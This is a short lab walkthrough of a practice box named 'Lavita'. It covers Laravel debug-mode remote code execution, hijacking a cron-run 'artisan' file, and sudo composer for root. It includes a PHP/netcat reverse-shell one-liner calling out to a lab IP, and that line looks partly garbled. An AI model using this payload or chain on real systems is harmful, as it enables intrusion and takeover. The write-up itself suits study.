# Lavita \[Inter]

## Report

Laravel 8.4.0 is vulnerable to RCE when the 'debug' feature is turned on. Monitoring processes via pspy we see a script running every minute as user 'splunk' called 'artisan' which is editable by 'www-data'. Add a reverse shell payload to become 'splunk'. We can run composer as sudo - GTFOBins to root

### Hint

Does working with such a mid box count as a hint cus my payload was on point if only the stupid thing would work via VPN

## Cheatsheet

{% code title="That PHP payload is deadly" %}
```
Turn DEBUG ON for exploit to work
busybox reverse shell
echo "<?php system('rm /tmp/f;mkfifo /tm&1|nc 192.168.49.51 8001>/tmp/f'); ?>" > artisan
```
{% endcode %}

## Loot

### Enumeration

192.168.57.38

#### 80

Laravel 8.4.0

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Uploading image after logging in does not seem to do anything, no file in images directory either</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Toggling debug seems to change a value 'token'</p></figcaption></figure>

In requests with and without debugging, the token is sent but we don't see any difference

### Attack Vectors

{% embed url="https://github.com/joshuavanderpoll/CVE-2021-3129?source=post_page-----12bfd272e9cf---------------------------------------" %}

Turn debug ON before running exploit

### PrivEsc

```
www-data
2025/09/25 10:05:01 CMD: UID=1001 PID=1194 | /usr/bin/php /var/www/html/lavita/artisan clear:pictures
-rw-r--r-- 1 www-data www-data 100 Sep 25 10:14 artisan

skunk
/usr/bin/composer --working-dir=/var/www/html/lavita *
```

### Creds

None

### Proof

None
